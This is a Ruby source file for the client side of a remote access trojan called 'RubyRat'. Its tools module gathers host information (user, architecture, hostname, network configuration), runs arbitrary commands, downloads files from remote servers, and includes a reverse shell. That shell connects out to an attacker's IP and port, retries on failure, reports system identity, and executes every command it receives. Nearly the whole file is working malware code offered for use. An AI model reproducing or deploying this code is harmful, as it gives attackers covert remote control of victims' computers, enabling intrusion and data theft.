##
#
# File containing all of the necessary functions for the client to work properly
#
##
require 'etc'
require 'core'
require 'net/http'
require 'open3'

module RubyRat
  module Tools
    # Performs a port scan on a single host
    def self.scan_single_host(addr)
      true  # TODO
    end

    def self.getarch
      case RUBY_PLATFORM
        when /mswin|windows/i
          `wmic OS get OSArchitecture`.split("\n")[1]
        when /linux|arch/i
          `uname -m`
        when /sunos|solaris/i
          `uname -m`
        when /darwin/i
          `uname -m`
        else
          return ''
      end
    end

    def self.ls
      case RUBY_PLATFORM
        when /mswin|windows/i
          `dir`
        when /linux|arch/i
          `ls`
        when /sunos|solaris/i
          `ls`
        when /darwin/i
          `ls`
        else
          return ''
      end
    end

    def self.sysinfo
      results = {}
      results[:os]   = RUBY_PLATFORM
      results[:user] = Etc.getlogin
      results[:arch] = self.getarch
      results[:name] = Socket.gethostname
      table = Terminal::Table.new do |t|
        t << ['Client information', '']
        t << :separator
        t << ['OS', results[:os]]
        t << ['User', results[:user]]
        t << ['Architecture', results[:arch]]
        t << ['Computer name', results[:name]]
      end
      table.to_s
    end

    # This function isn't really needed but it's nice to keep things organizes
    def self.pwd
      Dir.pwd
    end

    # Same idea as above
    def self.pid
      #puts Process.pid
      Process.pid
    end

    def self.execute(cmd)
      `#{cmd}`
    end

    # Gets a file from a remote server
    def self.wget(addr)

      if addr.start_with? 'http'
          return "Error: URL cannot start with 'http(s)'"
      end

      parsed = addr.split('/')
      website = parsed[0]
      filepath = parsed[1..-1].join '/'
      filepath[0, 0] = '/'  # Prepend a slash
      filename = parsed[-1]

      begin
        Net::HTTP.start(website) do |http|
          resp = http.get(filepath)
          @file = File.new(filename, 'w')
          @file.write(resp.body)
          @file.close
        end
        return 'Download successful'
      rescue Exception => e
        return "Download failed: #{e.message}"
      end
    end

    def self.ifconfig(plat)
      return `ifconfig` if plat != 'win'
      `ipconfig /all`
    end

    # brought to you in part by: https://github.com/Hood3dRob1n/RubyCat/blob/master/rubycat.rb
    def self.shell(ip, port, retries=5)
      while retries.to_i > 0
      begin
        socket = TCPSocket.new "#{ip}", "#{port}"
        break
      rescue
        # If we fail to connect, wait a few and try again
        sleep 10
        retries = retries.to_i - 1
        retry
      end
    end
    # Run commands with output sent to stdout and stderr
    begin
      socket.puts "Server Info:"
      # First we scrape some basic info....
      if RUBY_PLATFORM =~ /win32|win64|\.NET|windows|cygwin|mingw32/i
        count=0
        while count.to_i < 3
          if count.to_i == 0
            command="echo Winblows"
            socket.print "BUILD: \n"
          elsif count.to_i == 1
            command="whoami"
            socket.print "ID: "
          elsif count.to_i == 2
            command="chdir"
            socket.print "PWD: "
          end
          count = count.to_i + 1
          # Open3 to exec
          Open3.popen2e("#{command}") do | stdin, stdothers |
            IO.copy_stream(stdothers, socket)
          end
        end
      else
        count=0
        while count.to_i < 3
          if count.to_i == 0
            command="uname -a"
            socket.print "BUILD: \n"
          elsif count.to_i == 1
            command="id"
            socket.print "ID: "
          elsif count.to_i == 2
            command="pwd"
            socket.print "PWD: "
          end
          count = count.to_i + 1
          # Oen3 to exec
          Open3.popen2e("#{command}") do | stdin, stdothers |
            IO.copy_stream(stdothers, socket)
          end
        end
      end
      # Now we drop to Pseudo shell :)
      while(true)
        socket.print "\n(RubyCat)> "
        command = socket.gets.chomp
        if command.downcase == 'exit' or command.downcase == 'quit'
          socket.puts "\nOK, closing connection....\n"
          socket.puts "\ngot r00t?\n\n"
          break # Exit when asked nicely :p
        end
        # Open3 to exec
        Open3.popen2e("#{command}") do | stdin, stdothers |
          IO.copy_stream(stdothers, socket)
        end
      end
    rescue
      # If we fail for some reason, try again
      retry
    end
    end

  end
end
